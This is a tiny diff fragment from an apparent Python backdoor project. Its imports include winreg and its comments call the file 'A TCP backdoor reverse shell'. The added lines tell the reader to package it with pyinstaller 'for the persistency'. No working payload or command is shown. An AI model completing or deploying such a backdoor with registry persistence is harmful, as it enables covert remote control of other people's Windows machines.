@@ -7,6 +7,9 @@ import time
 import shutil
 import winreg as wreg
 
+#first of all run pyinstaller to convert the script to an app for the persistency
+#Script Kiddies keep off
+
 
 
 #A TCP backdoor reverse shell
